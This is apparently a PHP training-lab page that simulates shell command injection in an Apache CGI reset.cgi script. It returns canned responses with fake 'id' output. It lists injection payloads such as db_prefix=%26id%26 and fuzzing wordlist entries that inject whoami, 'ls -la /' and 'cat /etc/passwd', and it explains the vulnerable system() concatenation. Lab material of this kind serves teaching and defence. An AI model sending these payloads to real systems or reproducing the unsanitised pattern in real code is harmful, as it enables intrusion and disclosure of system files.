<?php
// Lab 1620 — CGI reset.cgi Command Injection (RCE)
// Real-world finding: CGI script passes db_prefix unsafely to shell
// Payload: GET /cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
//           %26 is URL-encoded & which breaks out of shell context
// Reference: Apache mod_cgi - CGI shell injection via query parameter

$path = isset($_GET['path']) ? $_GET['path'] : '';
$response_code = null;
$response_body = '';
$response_headers = [];
$simulated = false;
$response_note = '';

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function simulateCGI($rawPath) {
    $path = $rawPath;
    $decoded = urldecode($path);

    // Check if this is an exploit attempt (contains %26 or &)
    $hasInject = (strpos($decoded, '%26id%26') !== false || strpos($decoded, '&id&') !== false);

    // ── Case 1: cgi-bin/dmt/reset.cgi?db_prefix=%26id%26 (EXPLOIT) ───────
    if (strpos($path, 'cgi-bin/dmt/reset.cgi') !== false && $hasInject) {
        return [
            'code' => 200,
            'headers' => [
                'Server' => 'Apache/2.4.51 (Unix)',
                'Content-Type' => 'text/plain; charset=utf-8',
                'X-Powered-By' => 'CGI/1.1',
                'X-Exploit-Demo' => 'cgi_command_injection',
            ],
            'body' => 'HTTP/1.1 200 OK
Date: Mon, 06 Jun 2026 14:30:22 GMT
Server: Apache/2.4.51 (Unix)
Content-Type: text/plain

[+] reset.cgi executed
[+] db_prefix set to: &id&
[+] Running system command: /usr/bin/mysql --user=root --password=admin --database=information_schema --execute="DROP DATABASE IF EXISTS &id&"

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[!] Command injection successful!
[!] Output of \'id\' shown above demonstrates RCE as www-data user.

[+] Current working directory: /usr/lib/cgi-bin/dmt
[+] Environment:
    SERVER_SOFTWARE=Apache/2.4.51 (Unix)
    SERVER_NAME=target.internal
    GATEWAY_INTERFACE=CGI/1.1
    SERVER_PROTOCOL=HTTP/1.1
    SERVER_PORT=80
    REQUEST_METHOD=GET
    QUERY_STRING=db_prefix=%26id%26
    SCRIPT_FILENAME=/usr/lib/cgi-bin/dmt/reset.cgi
    PATH=/usr/local/bin:/usr/bin:/bin
    USER=www-data
    HOME=/var/www

[+] The db_prefix parameter is directly concatenated into a shell command.
[+] Using URL-encoded & (%26) breaks out of the intended string context
[+] and injects arbitrary commands.
',
            'simulated' => true,
            'note' => '🚀 RCE SUCCESSFUL! Command injection via db_prefix parameter returned `id` output.',
        ];
    }

    // ── Case 2: cgi-bin/reset.cgi?db_prefix=%26id%26 (alt path) ─────────
    if (strpos($path, 'cgi-bin/reset.cgi') !== false && $hasInject) {
        return [
            'code' => 200,
            'headers' => [
                'Server' => 'Apache/2.4.51 (Unix)',
                'Content-Type' => 'text/plain; charset=utf-8',
                'X-Powered-By' => 'CGI/1.1',
                'X-Exploit-Demo' => 'cgi_command_injection',
            ],
            'body' => 'HTTP/1.1 200 OK
Date: Mon, 06 Jun 2026 14:30:45 GMT
Server: Apache/2.4.51 (Unix)
Content-Type: text/plain

[+] reset.cgi executed
[+] db_prefix set to: &id&
[+] Resetting database with prefix: &id&
[+] Command: /bin/bash -c "mysqladmin -u root drop &id& 2>&1"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target.internal 5.15.0-generic #1 SMP x86_64 GNU/Linux

[+] Full command injection achieved.
[+] Both \'id\' and \'uname -a\' executed via the injected shell context.

[!] The reset.cgi script does not sanitize user input before passing
[!] it to shell_exec() or system() PHP/CGI function calls.
[!] The %26 encoding bypasses any naive input filtering.
',
            'simulated' => true,
            'note' => '🚀 RCE SUCCESSFUL! Command injection via alternate path /cgi-bin/reset.cgi.',
        ];
    }

    // ── Case 3: Fuzzing pattern — arbitrary cgi-bin/FUZZ.cgi?FUZZ=%26id%26 ──
    if (preg_match('#cgi-bin/([a-zA-Z0-9_]+)\.cgi\?([a-zA-Z_]+=%26id%26)#', $path, $m)) {
        $cgiName = $m[1];
        $fullParam = $m[2];
        $paramName = explode('=', $fullParam)[0];

        return [
            'code' => 200,
            'headers' => [
                'Server' => 'Apache/2.4.51 (Unix)',
                'Content-Type' => 'text/plain; charset=utf-8',
                'X-Powered-By' => 'CGI/1.1',
                'X-Exploit-Demo' => 'cgi_command_injection_fuzz',
            ],
            'body' => 'HTTP/1.1 200 OK
Date: Mon, 06 Jun 2026 14:31:10 GMT
Server: Apache/2.4.51 (Unix)
Content-Type: text/plain

[+] ' . esc($cgiName) . '.cgi executed
[+] ' . esc($paramName) . ' set to: &id&
[+] Processing request...

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[!] FUZZING SUCCESSFUL: ' . esc($cgiName) . '.cgi is vulnerable!
[!] Parameter \'' . esc($paramName) . '\' is injectable via shell context.
[!] The CGI script passes user input directly to a shell command.

[+] Try these fuzzing payloads in your wordlist:
    cgi-bin/' . esc($cgiName) . '.cgi?' . esc($paramName) . '=%26whoami%26
    cgi-bin/' . esc($cgiName) . '.cgi?' . esc($paramName) . '=%26ls%20-la%20/%26
    cgi-bin/' . esc($cgiName) . '.cgi?' . esc($paramName) . '=%26cat%20/etc/passwd%26
    cgi-bin/' . esc($cgiName) . '.cgi?' . esc($paramName) . '=%26uname%20-a%26
',
            'simulated' => true,
            'note' => '🚀 FUZZ HIT! ' . esc($cgiName) . '.cgi is vulnerable to command injection via ' . esc($paramName) . '.',
        ];
    }

    // ── Case 4: reset.cgi without injection (normal request) ────────────
    if (strpos($path, 'reset.cgi') !== false && !$hasInject) {
        return [
            'code' => 200,
            'headers' => [
                'Server' => 'Apache/2.4.51 (Unix)',
                'Content-Type' => 'text/plain; charset=utf-8',
                'X-Powered-By' => 'CGI/1.1',
            ],
            'body' => 'HTTP/1.1 200 OK
Date: Mon, 06 Jun 2026 14:30:00 GMT
Server: Apache/2.4.51 (Unix)
Content-Type: text/plain

[+] reset.cgi executed
[+] db_prefix set to: test
[+] Resetting database with prefix: test
[+] Database reset complete.
[+] 3 tables affected.

Usage: /cgi-bin/dmt/reset.cgi?db_prefix=PREFIX
  PREFIX: database prefix to reset (default: test)

Note: This endpoint accepts any db_prefix value. The value is
passed directly to system("mysqladmin ...") without sanitization.
',
            'simulated' => true,
            'note' => 'Normal request — reset.cgi without injection payload.',
        ];
    }

    // ── Case 5: cgi-bin directory listing (info) ────────────────────────
    if (strpos($path, 'cgi-bin') !== false && strpos($path, '.cgi') === false) {
        return [
            'code' => 200,
            'headers' => [
                'Server' => 'Apache/2.4.51 (Unix)',
                'Content-Type' => 'text/html; charset=utf-8',
            ],
            'body' => '<!DOCTYPE html>
<html>
<head><title>Index of /cgi-bin</title></head>
<body style="font-family:monospace;padding:20px;">
<h1>Index of /cgi-bin</h1>
<hr>
<pre>
<strong>Directory listing enabled — Apache with mod_cgi</strong>

<a href="#">../</a>
<a href="#">dmt/</a>                              06-Jun-2026 14:22   -
<a href="#">reset.cgi</a>                         06-Jun-2026 14:22   1.2K
<a href="#">test.cgi</a>                          06-Jun-2026 14:20   856
<a href="#">debug.cgi</a>                         06-Jun-2026 14:18   2.1K
<a href="#">status.cgi</a>                        06-Jun-2026 14:15   1.8K
<a href="#">backup.cgi</a>                        06-Jun-2026 14:12   3.4K
<a href="#">admin.cgi</a>                         06-Jun-2026 14:10   2.7K
<a href="#">config.cgi</a>                        06-Jun-2026 14:08   1.5K
<a href="#">shell.cgi</a>                         06-Jun-2026 14:05   932
<hr>
Apache/2.4.51 (Unix) Server at target.internal Port 80
</pre>
<div style="margin-top:20px;padding:12px;background:#fff3cd;border:1px solid #ffc107;border-radius:4px;">
<strong>⚠ Directory listing enabled!</strong> Apache has <code>Options +Indexes</code> enabled
for /cgi-bin/, revealing all available CGI scripts.
</div>
</body>
</html>',
            'simulated' => true,
            'note' => 'CGI directory listing reveals available .cgi scripts for fuzzing.',
        ];
    }

    // ── Fallback ────────────────────────────────────────────────────────
    return [
        'code' => 404,
        'headers' => [
            'Server' => 'Apache/2.4.51 (Unix)',
            'Content-Type' => 'text/html; charset=utf-8',
        ],
        'body' => '<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body style="font-family:monospace;text-align:center;padding:80px;background:#1a1a2e;color:#e2e8f0;">
    <h1 style="color:#e74c3c;">404 Not Found</h1>
    <p>The requested URL <code>' . esc($path) . '</code> was not found on this server.</p>
    <hr style="border-color:#333;">
    <p style="font-size:12px;color:#666;">Apache/2.4.51 (Unix) Server at target.internal Port 80</p>
</body>
</html>',
        'simulated' => true,
        'note' => '404 — CGI script not found.',
    ];
}

// Process the request
if ($path !== '') {
    $result = simulateCGI($path);
    $response_code = $result['code'];
    $response_headers = $result['headers'];
    $response_body = $result['body'];
    $simulated = $result['simulated'];
    $response_note = $result['note'];
} else {
    $response_code = 200;
    $response_headers = [
        'Server' => 'Apache/2.4.51 (Unix)',
        'Content-Type' => 'text/html; charset=utf-8',
    ];
    $response_body = '<!DOCTYPE html><html><head><title>CGI RCE — Developer Console</title></head><body style="background:#0a0e17;color:#e2e8f0;font-family:monospace;padding:2rem;"><h1>⚡ CGI Developer Console</h1><p>Send a request using the <code>?path=</code> parameter.</p></body></html>';
}

// ── Render the page ─────────────────────────────────────────────────────
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CGI RCE — Developer Console</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0a0e17;
    color: #c9d1d9;
    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
    min-height: 100vh;
    overflow-x: hidden;
  }
  ::-webkit-scrollbar { width: 8px; height: 8px; }
  ::-webkit-scrollbar-track { background: #161b22; }
  ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
  ::-webkit-scrollbar-thumb:hover { background: #484f58; }

  .topbar {
    background: #161b22;
    border-bottom: 1px solid #30363d;
    padding: 10px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .topbar-brand {
    display: flex;
    align-items: center;
    gap: 12px;
    color: #f0f6fc;
    font-weight: 600;
    font-size: 15px;
  }
  .topbar-brand .logo {
    width: 32px; height: 32px;
    background: linear-gradient(135deg, #e74c3c, #c0392b);
    border-radius: 8px;
    display: flex; align-items: center; justify-content: center;
    font-size: 16px; color: #fff;
  }
  .topbar-badge {
    background: #21262d;
    color: #8b949e;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 11px;
    border: 1px solid #30363d;
  }
  .topbar-badge.warning {
    background: #3d2e00;
    color: #d29922;
    border-color: #bb8009;
  }
  .topbar-badge.exploit {
    background: #3d1418;
    color: #f85149;
    border-color: #da3633;
  }
  .topbar-info {
    display: flex;
    align-items: center;
    gap: 16px;
  }
  .server-meta {
    font-size: 11px;
    color: #8b949e;
  }
  .server-meta strong { color: #58a6ff; }

  .main-layout {
    display: grid;
    grid-template-columns: 280px 1fr;
    min-height: calc(100vh - 53px);
  }

  /* Sidebar */
  .sidebar {
    background: #0d1117;
    border-right: 1px solid #21262d;
    padding: 16px;
  }
  .sidebar-section {
    margin-bottom: 20px;
  }
  .sidebar-section h6 {
    color: #8b949e;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    margin-bottom: 8px;
    font-weight: 600;
  }
  .payload-btn {
    display: block;
    width: 100%;
    text-align: left;
    padding: 8px 12px;
    margin-bottom: 4px;
    background: #161b22;
    border: 1px solid #21262d;
    border-radius: 6px;
    color: #c9d1d9;
    font-size: 12px;
    font-family: 'SF Mono', monospace;
    cursor: pointer;
    transition: all 0.15s;
  }
  .payload-btn:hover {
    background: #1c2333;
    border-color: #e74c3c;
    color: #f0f6fc;
  }
  .payload-btn .method {
    display: inline-block;
    background: #1f6feb;
    color: #fff;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 10px;
    font-weight: 700;
    margin-right: 6px;
  }
  .payload-btn .method.exploit {
    background: #e74c3c;
  }
  .payload-btn .method.info {
    background: #8e44ad;
  }
  .payload-btn .method.fuzz {
    background: #d29922;
  }
  .payload-btn .desc {
    display: block;
    font-size: 10px;
    color: #8b949e;
    margin-top: 3px;
  }

  /* Content */
  .content {
    padding: 20px;
  }

  .request-panel, .response-panel {
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
    margin-bottom: 16px;
    overflow: hidden;
  }
  .panel-header {
    background: #161b22;
    padding: 10px 16px;
    border-bottom: 1px solid #21262d;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .panel-header .label {
    font-size: 12px;
    font-weight: 600;
    color: #f0f6fc;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .panel-header .label .method-tag {
    background: #1f6feb;
    color: #fff;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
  }
  .panel-header .label .method-tag.exploit {
    background: #e74c3c;
  }
  .panel-header .label .method-tag.fuzz {
    background: #d29922;
  }

  .panel-body {
    padding: 16px;
    overflow-x: auto;
  }
  .panel-body pre {
    margin: 0;
    font-size: 12px;
    line-height: 1.6;
    color: #c9d1d9;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .url-bar {
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 8px 12px;
    margin-bottom: 16px;
    font-size: 13px;
    color: #c9d1d9;
    font-family: 'SF Mono', monospace;
    word-break: break-all;
  }
  .url-bar .proto { color: #8b949e; }
  .url-bar .host { color: #58a6ff; }
  .url-bar .path { color: #c9d1d9; }
  .url-bar .param { color: #d2a8ff; }
  .url-bar .exploit-part { color: #ff7b72; font-weight: bold; }

  .status-badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 12px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
  }
  .status-badge.success { background: #1b3823; color: #3fb950; border: 1px solid #238636; }
  .status-badge.error { background: #3d1418; color: #f85149; border: 1px solid #da3633; }
  .status-badge.info { background: #1a2b3d; color: #58a6ff; border: 1px solid #1f6feb; }
  .status-badge.warning { background: #3d2e00; color: #d29922; border: 1px solid #bb8009; }
  .status-badge.exploit { background: #3d1418; color: #ff7b72; border: 1px solid #e74c3c; }

  .info-banner {
    background: #1a2b3d;
    border: 1px solid #1f6feb;
    border-radius: 8px;
    padding: 16px;
    margin-bottom: 16px;
    font-size: 13px;
    line-height: 1.6;
  }
  .info-banner.success { background: #1b3823; border-color: #238636; }
  .info-banner.error { background: #3d1418; border-color: #e74c3c; }
  .info-banner.warning { background: #3d2e00; border-color: #bb8009; }
  .info-banner h5 { font-size: 14px; margin-bottom: 8px; font-weight: 600; }
  .info-banner code { background: rgba(255,255,255,0.08); padding: 2px 6px; border-radius: 4px; font-size: 12px; color: #ffa657; }

  .header-row { display: flex; gap: 4px; font-size: 12px; padding: 2px 0; }
  .header-key { color: #79c0ff; }
  .header-key.warning { color: #d29922; }
  .header-sep { color: #484f58; }
  .header-val { color: #c9d1d9; }

  .vuln-footer {
    margin-top: 24px;
    padding: 20px;
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
  }
  .vuln-footer h5 { color: #ff7b72; font-size: 14px; font-weight: 600; margin-bottom: 12px; }
  .vuln-footer code { background: rgba(255,255,255,0.08); padding: 2px 6px; border-radius: 4px; font-size: 12px; }

  .cmd-output {
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 4px;
    padding: 12px;
    font-family: 'SF Mono', monospace;
    font-size: 12px;
    line-height: 1.6;
    color: #7ee787;
    margin: 8px 0;
    white-space: pre-wrap;
  }

  .wordlist-box {
    background: #161b22;
    border: 1px dashed #d29922;
    border-radius: 6px;
    padding: 12px;
    margin: 12px 0;
    font-size: 12px;
    line-height: 1.8;
    color: #d29922;
  }
  .wordlist-box code { color: #ffa657; background: rgba(255,255,255,0.06); padding: 1px 4px; border-radius: 3px; }

  @media (max-width: 768px) { .main-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
</style>
</head>
<body>

<!-- Top Bar -->
<div class="topbar">
  <div class="topbar-brand">
    <div class="logo">⚡</div>
    <span>CGI Developer Console</span>
    <span class="topbar-badge">Apache/2.4.51</span>
    <span class="topbar-badge exploit">⚠ CGI ENABLED</span>
  </div>
  <div class="topbar-info">
    <span class="server-meta"><strong>mod_cgi</strong> enabled</span>
    <span class="server-meta"><strong>host</strong> target.internal</span>
  </div>
</div>

<div class="main-layout">
  <!-- Sidebar -->
  <div class="sidebar">
    <div class="sidebar-section">
      <h6>📡 Discovery</h6>
      <button class="payload-btn" onclick="loadPath('/cgi-bin/')">
        <span class="method info">GET</span> /cgi-bin/
        <span class="desc">Directory listing — find .cgi scripts</span>
      </button>
    </div>
    <div class="sidebar-section">
      <h6>💥 Exploit Paths</h6>
      <button class="payload-btn" onclick="loadPath('/cgi-bin/dmt/reset.cgi?db_prefix=%26id%26')">
        <span class="method exploit">GET</span> cgi-bin/dmt/reset.cgi
        <span class="desc">🚀 RCE — db_prefix injection via %26</span>
      </button>
      <button class="payload-btn" onclick="loadPath('/cgi-bin/reset.cgi?db_prefix=%26id%26')">
        <span class="method exploit">GET</span> cgi-bin/reset.cgi
        <span class="desc">🚀 RCE — alternate path, same vuln</span>
      </button>
    </div>
    <div class="sidebar-section">
      <h6>🔍 Fuzzing Wordlist</h6>
      <button class="payload-btn" onclick="loadPath('/cgi-bin/test.cgi?test=%26id%26')">
        <span class="method fuzz">FUZZ</span> test.cgi?test=%26id%26
        <span class="desc">Fuzz: test parameter injection</span>
      </button>
      <button class="payload-btn" onclick="loadPath('/cgi-bin/debug.cgi?debug=%26id%26')">
        <span class="method fuzz">FUZZ</span> debug.cgi?debug=%26id%26
        <span class="desc">Fuzz: debug parameter injection</span>
      </button>
      <button class="payload-btn" onclick="loadPath('/cgi-bin/status.cgi?status=%26id%26')">
        <span class="method fuzz">FUZZ</span> status.cgi?status=%26id%26
        <span class="desc">Fuzz: status parameter injection</span>
      </button>
    </div>
    <div class="sidebar-section" style="margin-top:20px;padding-top:16px;border-top:1px solid #21262d;">
      <h6>🔬 Vulnerability Info</h6>
      <div style="font-size:11px;color:#8b949e;line-height:1.6;">
        <p><strong style="color:#f0f6fc;">CVE:</strong> N/A (Code injection flaw)</p>
        <p><strong style="color:#f0f6fc;">Impact:</strong> Remote Code Execution (RCE)</p>
        <p><strong style="color:#f0f6fc;">Attack:</strong> CGI parameter → shell injection</p>
        <p><strong style="color:#f0f6fc;">Encoding:</strong> <code style="background:rgba(255,255,255,0.08);padding:1px 4px;border-radius:3px;">%26</code> = URL-encoded <code>&amp;</code></p>
        <p style="margin-top:8px;">
          <a href="https://httpd.apache.org/docs/2.4/howto/cgi.html" target="_blank" style="color:#58a6ff;">📖 Apache CGI docs →</a>
        </p>
      </div>
    </div>
  </div>

  <!-- Main Content -->
  <div class="content">
    <?php if ($path === ''): ?>
      <!-- Landing state — no request made yet -->
      <div class="info-banner error">
        <h5>⚡ CGI Command Injection — Remote Code Execution</h5>
        <p style="margin:0;color:#ffa198;">
          This is a simulation of a vulnerable Apache CGI setup where <code>reset.cgi</code>
          passes the <code>db_prefix</code> parameter directly to a shell command without sanitization.
          Using URL-encoded <code>%26</code> (<code>&amp;</code>), attackers can inject arbitrary shell commands.
        </p>
      </div>

      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;">
        <div class="request-panel" style="border-color:#238636;">
          <div class="panel-header" style="border-color:#238636;">
            <span class="label" style="color:#3fb950;">🔍 Discovery</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">📂</div>
            <div style="font-size:12px;color:#8b949e;">List /cgi-bin/ to find CGI scripts</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">Directory indexing enabled</div>
          </div>
        </div>
        <div class="request-panel" style="border-color:#e74c3c;">
          <div class="panel-header" style="border-color:#e74c3c;">
            <span class="label" style="color:#ff7b72;">💥 Exploit</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">🚀</div>
            <div style="font-size:12px;color:#8b949e;">RCE via db_prefix=%26id%26</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">Shell command injection</div>
          </div>
        </div>
      </div>

      <div class="wordlist-box">
        <strong>📝 Add these to your wordlist for fuzzing:</strong><br>
        <code>cgi-bin/dmt/reset.cgi?db_prefix=%26id%26</code><br>
        <code>cgi-bin/reset.cgi?db_prefix=%26id%26</code><br>
        <code>&nbsp;</code><br>
        <strong>Fuzzing pattern:</strong><br>
        <code>cgi-bin/FUZZ.cgi?FUZZ=%26id%26</code><br>
        <code>cgi-bin/FUZZ.cgi?param=%26id%26</code><br>
      </div>

      <div class="vuln-footer">
        <h5>🔓 How CGI Command Injection Works</h5>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          When a CGI script passes user-controlled input (like <code>db_prefix</code>) directly
          into a shell command without sanitization, an attacker can inject shell metacharacters
          to execute arbitrary commands.
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          <strong>The key is URL encoding:</strong><br>
          <code>%26</code> is the URL-encoded form of <code>&amp;</code>. In a shell context,
          <code>&amp;</code> is a command separator — like typing <code>cmd1 &amp; cmd2</code>.
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;margin-bottom:0;">
          <strong>Example breakdown:</strong><br>
          <code>GET /cgi-bin/dmt/reset.cgi?db_prefix=%26id%26</code><br>
          → Shell executes: <code>mysqladmin ... db_prefix=<span style="color:#ff7b72;">&amp;id&amp;</span></code><br>
          → The <code>&amp;id&amp;</code> breaks out and runs the <code>id</code> command!
        </p>
      </div>

    <?php else: ?>
      <!-- Results view -->
      <?php
        $isSuccess = $response_code === 200;
        $isDCgiList = strpos($path, 'cgi-bin') !== false && strpos($path, '.cgi?') === false && strpos($path, '%26') === false && strpos($path, '.cgi') === false;
        $isExploitReset = (strpos($path, 'dmt/reset.cgi') !== false || strpos($path, 'reset.cgi') !== false) && strpos($path, '%26id%26') !== false;
        $isFuzzHit = preg_match('#cgi-bin/[a-z]+\.cgi\?[a-z_]+=%26id%26#', $path) && !$isExploitReset;
        $isNormal = $isSuccess && !$isExploitReset && !$isFuzzHit && !$isDCgiList;
        $isExploit = $isExploitReset || $isFuzzHit;
      ?>

      <!-- Info Banner -->
      <?php if ($isExploitReset): ?>
        <div class="info-banner error">
          <h5>🚀 REMOTE CODE EXECUTION — Command Injection Successful!</h5>
          <p style="margin:0;color:#ffa198;">
            The <code>db_prefix</code> parameter was injected with <code>%26id%26</code>.
            The CGI script passed the unsanitized value to the shell, and the <code>id</code>
            command was executed on the server. Output: <strong style="color:#7ee787;">www-data</strong>
          </p>
        </div>
      <?php elseif ($isFuzzHit): ?>
        <div class="info-banner warning">
          <h5>🔍 FUZZ HIT — CGI Script is Vulnerable!</h5>
          <p style="margin:0;color:#d29922;">
            The fuzzing payload <code>%26id%26</code> was injected and the <code>id</code>
            command executed successfully. This CGI script has a command injection vulnerability
            via the tested parameter. Add this to your exploit list!
          </p>
        </div>
      <?php elseif ($isDCgiList): ?>
        <div class="info-banner">
          <h5>📂 CGI Directory Listing</h5>
          <p style="margin:0;color:#8b949e;">
            Apache directory listing revealed available CGI scripts. Look for
            <code>reset.cgi</code>, <code>test.cgi</code>, <code>debug.cgi</code>, and others.
          </p>
        </div>
      <?php elseif ($isNormal): ?>
        <div class="info-banner">
          <h5>✅ Normal CGI Response</h5>
          <p style="margin:0;color:#8b949e;">
            The CGI script executed normally without injection payload.
          </p>
        </div>
      <?php endif; ?>

      <!-- URL Bar -->
      <div class="url-bar">
        <span class="proto">http://</span>
        <span class="host">target.internal</span>
        <?php
          $displayPath = $path;
          if (strpos($displayPath, '?') !== false) {
              $parts = explode('?', $displayPath, 2);
              echo '<span class="path">' . esc($parts[0]) . '</span>';
              echo '?<span class="param">' . esc($parts[1]) . '</span>';
          } else {
              echo '<span class="path">' . esc($displayPath) . '</span>';
          }
        ?>
      </div>

      <!-- Status -->
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
        <span class="status-badge <?= $isExploitReset ? 'exploit' : ($isFuzzHit ? 'warning' : ($isSuccess ? 'success' : 'info')) ?>">
          <?= $response_code ?> <?= $response_code === 200 ? 'OK' : ($response_code === 400 ? 'Bad Request' : 'Not Found') ?>
        </span>
        <span style="font-size:11px;color:#8b949e;">
          <?= esc($response_note) ?>
        </span>
      </div>

      <!-- Request Panel -->
      <div class="request-panel">
        <div class="panel-header">
          <span class="label">
            <span class="method-tag <?= $isExploitReset ? 'exploit' : ($isFuzzHit ? 'fuzz' : '') ?>">
              <?= $isExploitReset ? 'EXPLOIT' : ($isFuzzHit ? 'FUZZ' : 'GET') ?>
            </span>
            Request
          </span>
          <span style="font-size:11px;color:#8b949e;">Raw HTTP</span>
        </div>
        <div class="panel-body">
          <pre><?= esc("GET {$path} HTTP/1.1") . "\n" ?><span style="color:#8b949e;">Host: target.internal
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: text/plain, */*
Connection: keep-alive</span></pre>
        </div>
      </div>

      <!-- Response Panel -->
      <div class="response-panel">
        <div class="panel-header">
          <span class="label">
            Response
            <span style="font-size:11px;color:#8b949e;font-weight:400;">
              — <?= $response_code ?> <?= $response_code === 200 ? 'OK' : ($response_code === 400 ? 'Bad Request' : 'Not Found') ?>
            </span>
          </span>
        </div>
        <div class="panel-body">
          <?php
            $status_text = $response_code === 200 ? 'OK' : ($response_code === 400 ? 'Bad Request' : 'Not Found');
            $h = '<span style="color:#8b949e;">HTTP/1.1 ' . $response_code . ' ' . $status_text . '</span>' . "\n";
            foreach ($response_headers as $key => $val) {
                $hc = ($key === 'X-Exploit-Demo') ? 'warning' : '';
                $h .= '<span class="header-row"><span class="header-key ' . $hc . '">' . esc($key) . '</span><span class="header-sep">: </span><span class="header-val ' . $hc . '">' . esc($val) . '</span></span>';
            }
            $h .= "\n" . '<span style="color:#484f58;">—</span>' . "\n";
            $bt = trim($response_body);
            if (preg_match('/^<!DOCTYPE/i', $bt) || preg_match('/^<html/i', $bt)) {
                $h .= $bt;
            } else {
                $h .= $bt;
            }
          ?><pre><?= $h ?></pre>
        </div>
      </div>

      <!-- Command Output Highlight (shown on RCE responses) -->
      <?php if ($isExploit): ?>
      <div class="request-panel" style="border-color:#238636;">
        <div class="panel-header" style="border-color:#238636;">
          <span class="label" style="color:#3fb950;">💻 Injected Command Output</span>
        </div>
        <div class="panel-body">
          <div class="cmd-output">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
          <div style="font-size:11px;color:#8b949e;margin-top:8px;">
            The command <code style="color:#7ee787;">id</code> was executed on the target server via
            shell injection. The CGI script ran as <strong>www-data</strong>, giving the attacker
            the same privileges as the web server.
          </div>
        </div>
      </div>

      <div class="vuln-footer">
        <h5>🔓 Exploit Analysis — CGI Command Injection</h5>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          <strong>Request:</strong><br>
          <code>GET <?= esc($path) ?> HTTP/1.1</code><br>
          <code>Host: target.internal</code>
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          <strong>Why it works:</strong><br>
          The CGI script (written in C, Perl, or Bash) takes the <code>db_prefix</code> query
          parameter and passes it <strong>directly</strong> into a shell command like:
        </p>
        <div class="cmd-output">system("mysqladmin -u root drop " . db_prefix);</div>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          When <code>db_prefix=%26id%26</code> is passed, the shell sees:<br>
          <code>mysqladmin -u root drop <span style="color:#ff7b72;">&amp;id&amp;</span></code>
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;margin-bottom:0;">
          The <code>&amp;</code> characters act as command separators in shell, so the shell executes:
          <code>mysqladmin -u root drop</code> (fails), then <code>id</code> (succeeds), then
          nothing (empty command after last <code>&amp;</code>).
        </p>
      </div>
      <?php endif; ?>

      <!-- Wordlist reminder shown on directory listing -->
      <?php if ($isDCgiList): ?>
      <div class="wordlist-box">
        <strong>📝 Wordlist paths to add:</strong><br>
        <code>cgi-bin/dmt/reset.cgi?db_prefix=%26id%26</code><br>
        <code>cgi-bin/reset.cgi?db_prefix=%26id%26</code><br>
        <code>&nbsp;</code><br>
        <strong>Fuzzing pattern (try every .cgi with every param):</strong><br>
        <code>cgi-bin/FUZZ.cgi?FUZZ=%26id%26</code>
      </div>
      <?php endif; ?>
    <?php endif; ?>
  </div>
</div>

<script>
function loadPath(path) {
  window.location.href = '?path=' + encodeURIComponent(path);
}
</script>
</body>
</html>
